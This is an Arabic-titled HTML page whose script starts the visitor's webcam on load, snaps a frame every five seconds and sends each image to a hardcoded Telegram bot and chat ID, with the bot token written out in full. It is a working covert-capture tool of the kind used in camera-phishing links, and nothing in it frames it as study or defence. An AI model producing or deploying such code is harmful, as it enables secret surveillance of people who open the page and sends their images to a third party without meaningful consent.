
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>التقاط صورة كل 5 ثواني</title>
  <style>
    body { text-align: center; font-family: sans-serif; }
    video, canvas { margin: 10px auto; max-width: 100%; }
  </style>
</head>
<body>
  <h2>📸 التقاط تلقائي كل 5 ثواني وإرسالها إلى تلغرام</h2>
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU'; // توكن البوت
    const CHAT_ID = '6036900535'; // Chat ID الخاص بك

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    // إرسال الصورة إلى تلغرام
    async function sendToTelegram(base64Image) {
      const blob = await (await fetch(base64Image)).blob();
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "image.png");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => console.log("✅ تم الإرسال", data))
      .catch(err => console.error("❌ فشل الإرسال", err));
    }

    // تشغيل الكاميرا وبدء الالتقاط
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setInterval(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");
          sendToTelegram(imageData);
        }, 5000); // كل 5 ثواني

      } catch (error) {
        alert("خطأ في تشغيل الكاميرا: " + error.message);
      }
    }

    window.onload = startCamera;
  </script>
</body>
</html>
